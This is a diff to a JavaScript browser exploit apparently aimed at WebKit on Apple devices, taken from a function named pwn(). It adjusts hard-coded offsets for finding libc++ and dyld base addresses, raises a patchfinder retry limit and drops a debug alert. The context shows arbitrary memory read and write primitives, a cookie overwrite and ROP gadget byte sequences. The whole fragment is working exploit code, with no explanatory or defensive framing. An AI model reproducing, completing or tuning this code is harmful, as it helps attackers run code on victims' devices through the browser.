@@ -401,7 +401,9 @@ function pwn() {
 
     // Find libcpp_base
     var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
-    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x95000);
+    // log(`[*] adrpldr_ZSt7nothrow_addr = ${(adrpldr_ZSt7nothrow_addr)} -> ${read64(adrpldr_ZSt7nothrow_addr)}  ${read64(Add(adrpldr_ZSt7nothrow_addr, 8))}`);
+    // return;
+    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x94c00);
 
     var try_count = 0;
     var opcode;
@@ -604,7 +606,7 @@ function pwn() {
     var dispatch = Add(airplayreceiver_base, APAdvertiserGetTypeID_addr);
     dispatch = Sub(dispatch, 0x2000);
     while (true) {
-        if(try_count > 10000) {
+        if(try_count > 13000) {
             log(`[-] failed webkit patchfinder`);
             return;
         }
@@ -704,6 +706,7 @@ function pwn() {
 
     try_count = 0;
     var dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, __ZL25sNotifyMonitoringDyldMain.lo() & 0xfff);
+    dyld_base = Sub(dyld_base, 0x8000);
     while (true) {
         if(try_count > 100) {
             log(`[-] failed webkit patchfinder`);
@@ -761,7 +764,6 @@ function pwn() {
     log(`[i] read cookie  = ${read64(cookieAddr)}`);
     write64(cookieAddr, new Int64(0));
     log(`[i] writechk  = ${read64(cookieAddr)}`);
-    alert(1);
 
     //gadgets
     // var stackloader = Add(webcore_base, offsets.stackloader); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
